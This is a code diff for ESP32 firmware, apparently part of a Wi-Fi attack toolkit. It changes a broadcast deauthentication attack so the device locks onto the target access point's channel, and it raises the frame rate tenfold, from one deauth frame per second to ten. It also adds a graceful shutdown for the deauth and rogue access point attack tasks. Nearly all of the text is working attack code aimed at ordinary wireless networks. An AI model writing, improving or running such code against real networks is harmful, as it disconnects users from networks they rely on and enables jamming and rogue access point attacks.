@@ -69,9 +69,12 @@ static void wifi_attack_brod_send_deauth_frame(void* args) {
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
   memcpy(&deauth_frame[10], ap_target->bssid, 6);
   memcpy(&deauth_frame[16], ap_target->bssid, 6);
+  if (ap_target->primary >= 1 && ap_target->primary <= 14) {
+    esp_wifi_set_channel(ap_target->primary, WIFI_SECOND_CHAN_NONE);
+  }
   while (running_broadcast_attack) {
     attack_brodcast_send_raw_frame(deauth_frame, sizeof(deauth_frame));
-    vTaskDelay(1000 / portTICK_PERIOD_MS);
+    vTaskDelay(100 / portTICK_PERIOD_MS);
   }
   task_brod_attack = NULL;
   vTaskDelete(NULL);
@@ -109,6 +112,10 @@ static void wifi_attack_rogueap(void* args) {
 void wifi_attacks_module_stop() {
   running_broadcast_attack = false;
   running_rogueap_attack = false;
+  // Give tasks a moment to terminate cooperatively
+  for (int i = 0; i < 10 && (task_brod_attack != NULL || task_rogue_attack != NULL); i++) {
+    vTaskDelay(pdMS_TO_TICKS(20));
+  }
   if (task_brod_attack != NULL) {
     vTaskDelete(task_brod_attack);
     task_brod_attack = NULL;
